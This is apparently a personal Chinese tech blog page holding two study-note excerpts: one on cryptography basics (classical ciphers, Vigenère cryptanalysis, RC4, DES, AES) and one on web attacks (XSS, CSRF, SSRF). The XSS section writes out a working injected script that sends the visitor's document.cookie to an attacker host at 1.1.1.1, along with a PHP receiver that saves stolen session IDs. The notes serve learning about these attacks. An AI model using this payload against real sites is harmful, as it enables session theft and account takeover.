-</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2021/08/14/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%9F%BA%E7%A1%80/">密码学基础</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2021-08-14</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2021-08-19</span></span></div></header><div class="post-body"><div class="post-excerpt"><p>&amp;第二章 古典密码</p>
-<p>一、古典密码与现代密码定义：</p>
-<p>根据是否使用计算机进行加解密来区分古典和现代。</p>
-<p>二、古典密码两大原则：</p>
-<p>1.替代(Substitution )：按一定规则替换明文中的元素形成密文。</p>
-<p>2.置换(Transposition)：按一定规则挪移明文形成密文。</p>
-<p>三、不同分类：</p>
-<p>1.Monoalphabetic Cipher:单字母替代密码(将明文字符集和密文字符集建立映射关系)</p>
-<p>▲单表替代：明文字符集与密文字符集任意替代(一一映射)，那么n个元素即有n!种置换。(若仅仅针对字符集，那么可以通过字母的使用频率来分析解密)</p>
-<p>(1)Caesar密码：将字母用它之后的第三个字母进行替代(26个字母循环)</p>
-<p>(2)keyword密码：</p>
-<p>①key：随意选取一个关键词key</p>
-<p>②去重：将key中的重复字母去掉，例如：success-&gt;suce</p>
-<p>③填表：将去重的key填入26个字母表前面位置，依次序接着填满26个字母。</p>
-<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//注释头</span><br><span class="line"></span><br><span class="line">suceabdfghijklmnopqrtvwxyz</span><br><span class="line">abcdefghijklmnopqrstuvwxyz</span><br></pre></td></tr></table></div></figure>
-
-<p>③加密：依据上表，查表将明文替代为密文。</p>
-<p>(3)Multiliteral Cipher：随意选取一个五字母的关键词key</p>
-<p>①填表：依据关键词key形成5×5的矩阵，将26个字母填充进去，其中i/j为一个。</p>
-<p>②加密：每个字母直接转换为key的行和列，即一个字母直接变成两个字母。</p>
-<p>(比较脆弱，因为密钥就存在于密文中)</p>
-<p>☆分析：利用字母使用频率分析：</p>
-<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191454806.png" alt="img"></p>
-<p>2.Polyalphabotic Cipher：多表替代密码，减少字母频率特征</p>
-<p>(1) Vigenere Cipher：</p>
-<p>①key：随意选取一个关键词key</p>
-<p>②对应：</p>
-<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//注释头</span><br><span class="line"></span><br><span class="line">HOLD HO LDH OLDHOLDHO</span><br><span class="line">THIS IS THE PLAINTEXT</span><br></pre></td></tr></table></div></figure>
-
-<p>③加密：</p>
-<p>A.查表加密(行列查表都可以，因为对称的)：</p>
-<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191454538.png" alt="img"></p>
-<p>B.mod26加密：</p>
-<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">//注释头</span><br><span class="line"></span><br><span class="line">0 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25</span><br><span class="line">A B C D E F G H I J K  L  M  N  O  P  Q  R  S  T  U  V  W  X  Y  Z</span><br><span class="line"></span><br><span class="line">            7  14 11 3  7  14 11 3  7  14 11 3  7  14 11 3  7  14</span><br><span class="line">key:        H  O  L  D  H  O  L  D  H  O  L  D  H  O  L  D  H  O </span><br><span class="line">plaintext:  T  H  I  S  I  S  T  H  E  P  L  A  I  N  T  E  X  T</span><br><span class="line">            19 7  8  18 8  18 19 7  4  15 11 0  8  13 19 4  23 19</span><br><span class="line"></span><br><span class="line">相加mod26：  0  21 19 21 15 6  4  10 11 3  22 3  15 1  4  7  4  7</span><br><span class="line">ciphertext: A  V  T  V  P  G  E  K  L  D  W  D  P  B  E  H  E  H</span><br></pre></td></tr></table></div></figure>
-
-<p>以上两种方法都可以。</p>
-<p>☆分析：</p>
-<p>①算密钥长度：一段密文中查找重复出现的几个字节，计算重复出现的几个</p>
-<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">//注释头</span><br><span class="line"></span><br><span class="line">key:        R U N R U N R U N R U N R U N R U N R U N R U N R U N</span><br><span class="line">plaintext:  T O B E O R N O T T O B E T H A T I S T H E Q U E S T</span><br><span class="line">ciphertext: K I O V I E E I G K I O V N U R N V J N U V K H V M G</span><br></pre></td></tr></table></div></figure>
-
-<p>KIOV和下一个KIVO，NU和下一个NU，分别相差9个字母，6个字母，多次重复计算，算出公因数，这里公因数是3，那么3就可能是密钥长度。</p>
-<p>②变成单表替代：假设得到公因数长度为abcdef，则进行如下计算：</p>
-<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//注释头</span><br><span class="line"></span><br><span class="line">key:        abcde fabcd efabc defab cdefa bcdef abcde fabcd efabc defab</span><br><span class="line">ciphertext: lpkso fjbnn mpfls rneoi yqrlx bkqtz ucxot ssbvb wpjil geckb</span><br></pre></td></tr></table></div></figure>
-
-<p>将所有由a加密的字母提取出来，为 ljfoxusjk…….重复多次。(这里选取abcdef中任意一个都可)。转换成6个单表替代密码，之后即可从单表替代密码ljfoxusjk…….中进行字母频率分析，逐步破译。(比如说j就有可能是e)</p>
-<p>(2)Autokey Cipher(针对Vigenere Cipher的改进)：选取关键词</p>
-<p>①key：选取关键词Key</p>
-<p>②初次：key加密对应数量的密文</p>
-<p>③重复：将前一次加密得到的密文拿来作为key加密。</p>
-<p>☆很脆弱，密文即为密钥的一部分，可通过错位分析来直接解密：</p>
-<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">//注释头</span><br><span class="line"></span><br><span class="line">key:         capcnpwgd</span><br><span class="line">plaintext:   anautokeycipherprovidesalongkeyword</span><br><span class="line">ciphertext:  cnpwgd...........................</span><br></pre></td></tr></table></div></figure>
-
-<p>初始密钥为cap，之后依次得到cnp，wgd….</p>
-<p>(3)AutoKey Plaintext：(类似，但是是拿明文再进行加密)</p>
-<p>3.Rotor Ciphers：转轮密码</p>
-<p>(1)轮子的内部对应关系不变，外在触点可以转动：</p>
-<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191454996.png" alt="img">     <img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191454998.png" alt="img"></p>
-<p>(2)利用多个轮子合在一起形成加密关系，转动触点即可改变加密关系：</p>
-<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191454253.png" alt="img">  <img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191454189.png" alt="img"></p>
-<p>这里的初始化状态和转动方式就可看作是密钥。</p>
-<p>4.Polygraphic Cipher：多图替代密码</p>
-<p>(1)Play fair密码：双字母音节替代加密</p>
-<p>①key：随意选取密钥key</p>
-<p>②填表：key顺序加上剩余字母依次排列进5×5表中(这里key为harpsichord)</p>
-<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191454715.png" alt="img"></p>
-<p>③分组：对明文进行按两个字母一对进行分组，如果其中有字母对两个字母相同，就在其中填充一个其他字母(这个字母最好选取出现概率较小的字母，比如xx基本不会出现)：ballon -&gt; ba lx lo on</p>
-<p>④加密：</p>
-<p>A.落在矩阵同一行的明文字母对中字母由其右边字母代替，最右边则由最左边替代。例如：AR-&gt;RP</p>
-<p>B.落在矩阵同一列的明文字母对中字母由其下边字母代替，最下面则由最上面替代。例如：IM-&gt;EV</p>
-<p>C.不同行不同列的则由对称行列转化加密(同行替换)，例如：CT-&gt;DN，OU-&gt;BQ….</p>
-<p>☆分析：(m1,m2)-&gt;(c1,c2)，那么如果有(m2,m1)，则一定是(m1,m2)-&gt;(c2,c1)。可以将明文和密文对比移位。(具体的看PDF)</p>
-<p>(2)Double playfair密码：</p>
-<p>①选取两个关键词key，去重，填表构建两个矩阵，行对应排列：</p>
-<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191455819.png" alt="img"></p>
-<p>②给定一个数字，所有明文按照所选数字分组进行排列，不足的补指定字母。例如给定明文为this is double playfair cipher，数字为10，不足补x：</p>
-<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">thisisdoub</span><br><span class="line">leplayfair</span><br><span class="line"></span><br><span class="line">cipherxxxx</span><br><span class="line">xxxxxxxxxx</span><br></pre></td></tr></table></div></figure>
-
-<p>③按组进行加密，上述分组情况即为tl,he,ip…..cx,ix,px…….xx共计20组。</p>
-<p>④对每组进行加密，分别从两个矩阵中找到明文字母对，加密规则类似：</p>
-<p>A.不同行的即对角线交换：tl-&gt;op</p>
-<p>B.同行的由右边字母替代，但这里替代完之后还需要交换一下：br-&gt;ac</p>
-<p>5.Transposition cipher：</p>
-<p>(1)Skytale cipher：缠绕密码，一张图说明一切</p>
-<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191454647.png" alt="img"></p>
-<p>(2)Permutation cipher：</p>
-<p>①给定密钥，按字母表排列顺序。例如key，顺序为(2 1 3)。</p>
-<p>②依据密钥长度分组明文，不足补指定字符。例如Permutation cipher，分为Per mut ati onc iph erx(最后补了x)</p>
-<p>③根据密钥顺序置换，(2 1 3)即代表第二个字母放到第一个，第一个字母放到第二个，第三个字母放到第三个。可得ePr umt tai noc pih rex即为所求密文。</p>
-<p>(3)Column Permutation cipher：</p>
-<p>①给定密钥，按字母表排列顺序。例如key，顺序为(2 1 3)。</p>
-<p>②依据密钥长度分组明文，竖向排列。例如Permutation cipher，分为</p>
-<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">213</span><br><span class="line">Per </span><br><span class="line">mut </span><br><span class="line">ati </span><br><span class="line">onc </span><br><span class="line">iph </span><br><span class="line">er</span><br></pre></td></tr></table></div></figure>
-
-<p>③依据顺序将列竖向提取，横向生成密文：eutnpr Pmaonie rtich即为所求密文。</p>
-<p>(4)Double Permutation cipher：一样，只是重复两次</p>
-<p>&amp;第三章 流密码 Stream Cipher 生成</p>
-<p>1.LFSR：给定初始值，指定反馈位异或生成从左边进入，从右边出来生成生成密钥流，这里就会是101011 00….</p>
-<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191455530.png" alt="img"></p>
-<p>☆针对LFSR攻击：将密文逐两个异或得到分析段，如图第一段为密文段，第二段为分析段，其中重复部分相距的长度即为LFSR的两个线性反馈位的长度，这里是4，如上图的LFSR，之后再分析破解。</p>
-<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191454156.png" alt="img"></p>
-<p>2.RC4：</p>
-<p>(1)初始化一个数组S[]，一般为0-255，这里假设为0-7，S[]:[0,1,2,3,4,5,6,7]。之后初始化一个key顺序数组K[]给定初始密钥顺序，假设为567，重复至8位K[]:[5,6,7,5,6,7,5,6]。</p>
-<p>(2)通过KSA算法代码：</p>
-<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">j = 0 </span><br><span class="line">for i in range(0,255):</span><br><span class="line">    j = (j + S[i] + K[i])mod 256 </span><br><span class="line">    tmp = S[i]</span><br><span class="line">    S[i] = S[j]</span><br><span class="line">    S[j] = tmp</span><br></pre></td></tr></table></div></figure>
-
-<p>上述例子得到新的S[]:[5,4,0,7,1,6,3,2]</p>
-<p>(3)通过PRGA算法：</p>
-<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">i = 0</span><br><span class="line">j = 0</span><br><span class="line">i = (i + 1)mod 256</span><br><span class="line">j = (j + S[i]) mod 256</span><br><span class="line"></span><br><span class="line">tmp = S[i] </span><br><span class="line">S[i] = S[j] </span><br><span class="line">S[j] = tmp</span><br><span class="line"></span><br><span class="line">t = (S[j] + S[i])mod 256</span><br><span class="line">k = S[t]</span><br></pre></td></tr></table></div></figure>
-
-<p>上述例子得到K = 6，之后重复8次(n)，即可得到最终密钥K</p>
-<p>3.CA：cellular automata细胞自动机</p>
-<p>(1)1D，即一维的：</p>
-<p>①给定初始状态(一般随机生成)，这里选为0010100(多少bit都行)。</p>
-<p>②给定状态转换规则，一般给一个十进制数字，然后转换为二进制，这里选为23：</p>
-<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">000 001 010 011 100 101 110 111</span><br><span class="line"> 0   0   0   1   0   1   1   1   = 23</span><br></pre></td></tr></table></div></figure>
-
-<p>③依据规则演变至下一个状态(依据当前位和左右邻位)，那么初始状态就可以对应以下七种状态：</p>
-<p>000 001 010 101 010 100 000</p>
-<p>依据规则转化为 0001000，即为初始状态的之后的第一个状态。依据此规则可演变出多种状态。</p>
-<p>④再设定规则，从每个状态中取第x位作为密钥，那么n个状态就会对应生成n位的key。</p>
-<p>(2)2D，即二维的：原理类似，给定初始状态与规则。</p>
-<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191454153.png" alt="img"></p>
-<p>这里的Von Neumann Neighborhood和Moore Neighborhood对应两种不同的邻居选择规则。</p>
-<p>▲规则：</p>
-<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191455128.png" alt="img"></p>
-<p>这里的X为自定义的一个初始值0或1，之后的CNSWE分别对应英文certer，north，south，west，east，即中上下左右，加上是一个给定的规则，例如选定：(XCNSWE)为(001110)=14，那么14即为给定的规则。</p>
-<p>Si,j(t)即为当前状态分别对应的0或1的值，依据上述等式算出下一状态的值即可。(这里是Von Neumann Neighborhood)</p>
-<p>☆针对流密码攻击：插入明文攻击，假设攻击者可以插入1bit的指定明文，再次进行发送，然后也可以截获到密文，那么如下：</p>
-<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191454656.png" alt="img">  第一次(只知道密文Ci)</p>
-<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191455603.png" alt="img">第二次插入p后(知道密文Ci和p、c)</p>
-<p>现在可以通过p^c算出k2，带入第一张图，c2^k2算出p2，再带入第二张图p2^c3算出k3，依次类推可得到全部，除了p1,k1,c1。</p>
-<p>&amp;第四章 分组密码</p>
-<p>1.DES加密(Data Encryption Standard)：</p>
-<p>(1)密钥生成：<img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191454854.png" alt="img"></p>
-<p>①64位密钥，其中8位为奇偶校验位，生成子密钥过程中需要剔除，经过PC-1压缩得到k(56bit)<br>②将k分为KL0和KR0，各28bit<br>③KL0和KR0左移x位得到KL0x,KR0x<br>④将KL0x和KR0x合并，通过PC-2置换得到子密钥K0(48bit)<br>⑤将KL0x和KR0x拷贝一份得到下一轮的KL1和KR1</p>
-<p>重复3-5步16轮，共得到k0-k15个子密钥以供加密</p>
-<p>(2)加密流程：</p>
-<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191454057.png" alt="img"></p>
-<p>①以8个字母为一个单位取明文<br>②将一单位明文通过IT打乱得到Y0<br>③取Y0左边32位为PL0,右边32位为PR0<br>④将PR0复制一份为L1——-用作下一轮的L<br>⑤将PR0用EBOX扩展置换得到EPR0(48bit)<br>⑥将EPR0与K0异或得到K_X_P(48bit)<br>⑦将K_X_P用SBOX压缩得到SPR0(32bit)<br>⑧将SR0与PBOX进行置换得到PPR0<br>⑨将PPR0与L0异或得到下一轮的PR1</p>
-<p>重复4-9步16轮(其中f轮函数即为EBOX、Key异或、SBOX、PBOX)</p>
-<p>▲得到PR15和L15，左右交换后合并在一起后再经过IP逆运算最终置换得到密文</p>
-<p>(3)BOX事项：</p>
-<p>①EBOX：虽说是扩展，但直接依据顺序扩展即可。前bit-&gt;后bit，后bit-&gt;前bit。</p>
-<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191454861.png" alt="img"></p>
-<p>②SBOX：8个子BOX，每个子BOX为4×16矩阵，每行0-15以某个固定顺序排列，通过时48bit分为8个块，每个块6bit。首尾bit拼合为row，中间4bit拼合为column，依据(row,column)来在每个子BOX中找到对应的数字后转换为二进制即为4bit输出。</p>
-<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191454267.png" alt="img"></p>
-<p>之后IP,IP逆,PBOX都是正常的置换BOX。</p>
-<p>▲解密流程完全相同，只有密钥使用顺序相反。</p>
-<p>2.SDES加密：Simple，类似，不过只有两轮，位数也不太一样，分别循环左移1bit和2bit。各种子BOX也会对应修改。</p>
-<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191454258.png" alt="img"></p>
-<p>3.AES加密(Advanced Encryption Standard):</p>
-<p>▲有128bit，192bit和…忘了…以下以128bit为例子</p>
-<p>(1)密钥生成：</p>
-<p>①128bit分为16字节竖向排列：</p>
-<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">W0 W1 W2  W3 ..........</span><br><span class="line">-------------------------------------------------------</span><br><span class="line">K0 K4 K8  K12</span><br><span class="line">K1 K5 K9  K13</span><br><span class="line">K2 K6 K10 K14</span><br><span class="line">K3 K7 K11 K15</span><br></pre></td></tr></table></div></figure>
-
-<p>②依据规则计算W[4]至W[43]：</p>
-<p>W[i] = W[i-4] xor W[i-1]     i不为4的倍数时</p>
-<p>W[i] = W[i-4] xor T(W[i-1])  i为4的倍数时</p>
-<p>▲计算T(W[i-1]):</p>
-<p>A.将W[i-1]中字节元素横向排列，循环左移1个字节。</p>
-<p>B.将循环左移后的四个字节通过SBOX，得到[S0,S1,S2,S3]四个字节列表。(这个SBOX为16×16矩阵，需要将每个字节的前4bit作为row，后4bit作为column，(row,column)来在SBOX中寻找对应字节替换)</p>
-<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191454567.png" alt="img"></p>
-<p>C.计算常量：r[i] = 2^((i-4)/4)</p>
-<p>D.最终T(W[i-1]) = [S0 xor r(i),S1,S2,S3]</p>
-<p>即可求得W[0]-W[43]共计44个W[i]密钥。</p>
-<p>(2)加密流程：</p>
-<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191454120.png" alt="img"></p>
-<p>128bit输入，循环9轮，第10轮中没有MixColumn。</p>
-<p>(3)BOX注意：</p>
-<p>①KeyAdd：正常的128bit密钥和128bit明文块异或。</p>
-<p>②Substitution：即SBOX，为</p>
-</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2021/08/14/%E6%8A%A4%E7%BD%91Web%E5%AD%A6%E4%B9%A0/">护网Web学习</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2021-08-14</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2021-08-19</span></span></div></header><div class="post-body"><div class="post-excerpt"><p>偷溜来了护网，希望不会被逮住…..</p>
-<p>▲其实决定来之前压根就不会Web，连HTML，CSS，PHP等等最基础的东西都不了解。决定要来之后，就抽空学了一些简单的实际渗透方面的Web利用，像之前写的永恒之蓝，sqlmap，nmap，Burpsuite，ARP啥的都是那一小段时间疯狂补的东西。然后期间经历了一点小插曲，本来以为不会来了，阴差阳错又过来了。和我一位学Web开发的傻嘚一起来的</p>
-<p>一、HTML、CSS、PHP基础：</p>
-<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.w3school.com.cn/" >https://www.w3school.com.cn/</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
-<p>东西太杂，适当了解原理，以后即用即学。</p>
-<p>二、XSS攻击：跨站脚本（Cross-Site Scripting），四种类型，大概如下</p>
-<p>1.原理解析：</p>
-<p>(1)黑客通过某网站漏洞，将恶意代码注入到某网站中，生成类似图片，留言等进行伪装，内在是攻击链接。</p>
-<p>(2)用户访问该网站，无意中点击了该图片，留言，那么就执行了这段恶意代码，进入了攻击链接，泄露信息。</p>
-<p>2.例子：</p>
-<p>(1)原网站的HTML：</p>
-<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;xss攻击&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form action=&quot;./test.php&quot; method=&quot;post&quot;&gt;</span><br><span class="line">留言：&lt;input type=&quot;text&quot; name=&quot;content&quot; value=&quot;&quot;&gt;&lt;br/&gt;</span><br><span class="line">&lt;input type=&quot;submit&quot; name=&quot;&quot; value=&#x27;提交&#x27;&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;br/&gt;留言记录：&lt;br/&gt;</span><br></pre></td></tr></table></div></figure>
-
-<p>后缀改为html，打开后如下：</p>
-<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191450943.png" alt="img"></p>
-<p>(2)攻击者通过某些手段修改后如下：</p>
-<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;xss攻击&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form action=&quot;./test.php&quot; method=&quot;post&quot;&gt;</span><br><span class="line">留言：&lt;input type=&quot;text&quot; name=&quot;content&quot; value=&quot;&quot;&gt;&lt;br/&gt;</span><br><span class="line">&lt;input type=&quot;submit&quot; name=&quot;&quot; value=&#x27;提交&#x27;&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;br/&gt;留言记录：&lt;br/&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">var Str=document.cookie;                        //获取cookie</span><br><span class="line">var a =document.createElement(&#x27;a&#x27;);             //创建a标签</span><br><span class="line">a.href=&#x27;http://1.1.1.1/attack.php?&#x27;+Str;        //攻击者主机</span><br><span class="line">a.innerHTML=&quot;&lt;img src=&#x27;./aa.jpg&#x27;&gt;&quot;;             //掩护图片</span><br><span class="line">document.body.appendChild(a);                   //将标签添加到页面中</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></div></figure>
-
-<p>打开后如下：</p>
-<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191450848.png" alt="img"></p>
-<p>(3)当不小心点到该图片后，会跳转到<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="http://1.1.1.1/attack.php?Str%E8%BF%99%E4%B8%AAURL%E7%95%8C%E9%9D%A2%EF%BC%8C%E8%B7%B3%E5%87%BA%E5%A6%82%E4%B8%8B%E7%95%8C%E9%9D%A2%EF%BC%9A" >http://1.1.1.1/attack.php?Str这个URL界面，跳出如下界面：</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
-<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191450006.png" alt="img"></p>
-<p>其中array中就是访问该网站所得到的cookie令牌。</p>
-<p>攻击者的attack.php代码如下：</p>
-<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">header(&quot;content-type:text/html;charset=utf8&quot;);</span><br><span class="line">echo &quot;你的PHPSESSID被盗啦&quot;;</span><br><span class="line">echo &quot;&lt;pre&gt;&quot;;</span><br><span class="line">print_r($_GET);</span><br><span class="line">echo &quot;&lt;/pre&gt;&quot;;</span><br><span class="line">$cookie=$_GET[&#x27;PHPSESSID&#x27;];</span><br><span class="line">file_put_contents(&#x27;./xss.txt&#x27;, $cookie);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></div></figure>
-
-<p>攻击者将得到的cookie存储到他服务器1.1.1.1的xss.txt文件中，之后攻击者就可以利用从用户这得到的cookie来假装用户成功登录网站。</p>
-<p>3.防御手段：过滤输入，最有效的。</p>
-<p>三、CSRF攻击：跨站请求伪造（Cross-site request forgery）</p>
-<p>1.原理解析：</p>
-<p>(1)用户C打开浏览器，访问受信任网站A，输入用户名和密码请求登录网站A；</p>
-<p>(2)在用户信息通过验证后，网站A产生Cookie信息并返回给浏览器，此时用户登录网站A成功，可以正常发送请求到网站A；</p>
-<p>(3)用户未退出网站A之前，在同一浏览器中，打开一个TAB页访问网站B，这个网站B就是黑客用来攻击的自己搭建的一个网站，或者是黑客插入攻击代码的网站；</p>
-<p>(4)访问网站B后，接收到用户请求后(黑客插入的链接或者是黑客自建的网站，前者需要用户点击恶意代码链接，类似于XSS攻击，后者则不需要)，返回一些攻击性代码，并发出一个请求要求访问第三方站点A；</p>
-<p>(5)浏览器在接收到这些攻击性代码后，根据网站B的请求，在用户不知情的情况下携带Cookie信息，向网站A发出请求。网站A并不知道该请求其实是由B发起的，所以会根据用户C的Cookie信息以C的权限处理该请求，导致来自网站B的恶意代码被执行。</p>
-<p>▲简单来说就是利用恶意网站使得用户浏览器携带cookie和恶意代码请求来登录正常网站，这样黑客的恶意代码请求就可以在该网站被执行，从而使得黑客可以伪装成用户来执行任意操作，事后看到的也只是该用户的正常请求操作，基本没有什么攻击痕迹。</p>
-<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191450927.png" alt="img"></p>
-<p>2.实例解析：</p>
-<p>不搞了，DVWA上很多。</p>
-<p>四、SSRF攻击：Server-Side Request Forgery，服务端请求伪造</p>
-<p>1.原理解析：比较简单，常用来外网将服务器当跳板来探测内网。</p>
-<p>(1)利用服务器提供的功能，输入url获取图片，输入某ip查找信息等等。</p>
-<p>(2)构造我们需要的url，或者一些链接，服务来获取我们想要知道的信息。</p>
-<p>2.实例解析：</p>
-<p>不搞了，DVWA上很多。</p>
-<p>后面有时间再总结下吧，得滚去补落下的东西了。</p>
